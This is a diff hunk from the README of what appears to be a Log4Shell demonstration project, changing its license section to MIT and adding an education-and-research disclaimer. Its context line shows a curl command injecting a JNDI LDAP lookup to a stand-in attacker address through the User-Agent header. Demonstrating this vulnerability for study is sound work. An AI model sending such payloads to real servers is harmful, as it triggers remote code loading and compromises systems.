@@ -156,7 +156,9 @@ curl -H 'User-Agent: ${jndi:ldap://YOUR_IP:1389/Exploit}' http://localhost:8080/
 
 ## 📝 许可证
 
-本项目仅用于教育目的，使用者需自行承担使用风险。
+本项目采用 [MIT License](LICENSE) 开源协议。
+
+**特别声明**：本项目仅用于教育和安全研究目的，使用者需自行承担使用风险。
 
 ## ⚠️ 法律声明
 
